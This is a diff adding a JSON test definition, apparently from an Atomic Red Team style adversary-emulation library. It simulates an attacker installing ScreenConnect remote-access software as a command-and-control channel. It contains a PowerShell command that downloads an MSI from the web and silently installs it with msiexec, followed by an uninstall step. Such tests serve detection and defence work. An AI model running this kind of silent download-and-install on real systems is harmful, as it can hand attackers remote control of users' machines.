@@ -1,0 +1,44 @@
+{
+  "id": "4a18cc4e-416f-4966-9a9d-75731c4684c0",
+  "name": "ScreenConnect Application Download and Install on Windows",
+  "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "340fbfff-c6d7-47ee-9dec-ed4906673920",
+      "type": "execute-command",
+      "data": {
+        "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"\nmsiexec /i $installer /qn\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e7cd0506-68cf-4f6f-840b-44f5162ca934",
+      "type": "execute-command",
+      "data": {
+        "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nmsiexec /x $installer /qn\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "340fbfff-c6d7-47ee-9dec-ed4906673920",
+      "p": "on-success",
+      "o": "e7cd0506-68cf-4f6f-840b-44f5162ca934"
+    },
+    {
+      "s": "340fbfff-c6d7-47ee-9dec-ed4906673920",
+      "p": "on-failure",
+      "o": "e7cd0506-68cf-4f6f-840b-44f5162ca934"
+    }
+  ],
+  "tags": [
+    "T1219",
+    "atomic-red-team"
+  ]
+}
